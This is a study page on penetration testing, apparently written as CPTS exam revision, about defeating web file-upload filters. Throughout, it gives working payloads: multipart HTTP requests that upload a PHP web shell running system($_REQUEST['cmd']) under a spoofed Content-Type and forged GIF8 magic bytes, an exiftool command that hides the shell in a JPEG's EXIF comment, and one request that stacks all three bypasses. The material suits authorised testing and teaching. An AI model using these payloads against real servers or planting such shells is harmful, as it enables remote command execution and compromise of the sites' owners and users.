---
title: 'Content-Type, MIME & Magic Byte Filters'
description: 'When the server validates the file type instead of (or as well as) the extension — spoof the Content-Type header and forge magic bytes to slip an executable script past content checks.'
tags:
  - CPTS
  - Web
  - File Upload
  - Bypass
icon: material/file-compare
---

# Content-Type, MIME & Magic Byte Filters

!!! abstract "Beyond the extension"
    A stronger server checks the **file type**, not just its name. There are two flavours: the `Content-Type` header sent by the browser, and the actual **file content** (its "magic bytes"). Both are attacker-influenced, so both are bypassable — you just have to make your malicious file *look* like an image.

## Type 1 — Content-Type Header Validation

In a multipart upload, each file part carries its own `Content-Type` (MIME type) header that the browser sets from the file's extension:

```http
POST /upload.php HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: application/x-php          <-- the server may check THIS

<?php system($_REQUEST['cmd']); ?>
------WebKitFormBoundary--
```

A typical server-side check:

```php
$type = $_FILES['uploadFile']['type'];
if (!in_array($type, array('image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

The flaw: `$_FILES[...]['type']` is taken **straight from the request**, which you control. In your proxy, change the file part's `Content-Type` to an allowed value while keeping your PHP body and `.php` filename:

```http
Content-Disposition: form-data; name="uploadFile"; filename="shell.php"
Content-Type: image/png                  <-- spoofed; server is happy

<?php system($_REQUEST['cmd']); ?>
```

!!! tip "Find valid MIME types fast"
    Need the right MIME string? Common image types: `image/jpeg`, `image/png`, `image/gif`, `image/svg+xml`. A full reference lives in the IANA media-types registry, but those four cover most image whitelists.

## Type 2 — Magic Byte / File-Signature Validation

A more robust server ignores the header and inspects the **file content**. Most file formats start with a fixed signature ("magic bytes") that tools like `file` use to determine the real type:

| Type | Magic bytes (hex) | ASCII |
|------|-------------------|-------|
| JPEG | `FF D8 FF E0` | `ÿØÿà` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG␍␊␚␊` |
| GIF | `47 49 46 38 37 61` / `...39 61` | `GIF87a` / `GIF89a` |
| PDF | `25 50 44 46` | `%PDF` |

PHP's `mime_content_type()` and `finfo` read these bytes, not the extension or header:

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$type  = finfo_file($finfo, $_FILES['uploadFile']['tmp_name']);
if (!in_array($type, array('image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed"; die();
}
```

### The Bypass — Prepend a Magic Header

Make your file *start* like an image but still contain executable code. For GIF, the signature `GIF8` is enough:

```php title="shell.gif.php"
GIF8
<?php system($_REQUEST['cmd']); ?>
```

Now `finfo` reports `image/gif` (content check passes), and if the extension/handler lets it run as PHP, the `GIF8` text is simply printed before your shell output — harmless. You can also do this in your proxy by typing `GIF8` at the very start of the file body, before `<?php`.

!!! note "Real polyglots"
    For checks that parse the *whole* image (e.g. `getimagesize()`), a four-byte header isn't enough — you need a valid image that *also* contains code. Embed your payload in a real image's metadata (e.g. the EXIF `Comment` field) with `exiftool`:
    ```shell
    exiftool -Comment='<?php system($_REQUEST["cmd"]); ?>' clean.jpg
    mv clean.jpg shell.php.jpg
    ```
    This produces a file that opens as a valid image yet executes when requested as PHP (given a permissive handler or a [double-extension](whitelist-filters.md) win).

## Stacking Filters

Real targets often combine checks. Defeat them in layers, all in one request:

1. **Extension** → use a [double extension](whitelist-filters.md) or [allowed extension](blacklist-filters.md).
2. **Content-Type header** → spoof to `image/png`.
3. **Magic bytes** → prepend `GIF8` (or use an EXIF polyglot).

```http
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpg.php"
Content-Type: image/gif

GIF8
<?php system($_REQUEST['cmd']); ?>
```

!!! warning "Match the bypass to the check"
    Don't shotgun blindly. If the error changes when you fix the Content-Type, you've found the active check. Isolate one layer at a time so you understand exactly what the server validates.

## Key Takeaways

!!! success "Revision recap"
    - **Content-Type** comes from the request → spoof it to `image/png` in your proxy.
    - **Magic bytes** are read from content → prepend a signature like `GIF8` before `<?php`.
    - `finfo`/`mime_content_type()` read content; `$_FILES['type']` reads the header — know which one you're beating.
    - Whole-image parsers (`getimagesize`) need a real image polyglot — embed code via `exiftool` EXIF comment.
    - Stack the bypasses (extension + Content-Type + magic bytes) in a single request.

➡️ Next: [Limited File Uploads](limited-uploads.md) — damage you can do without RCE.
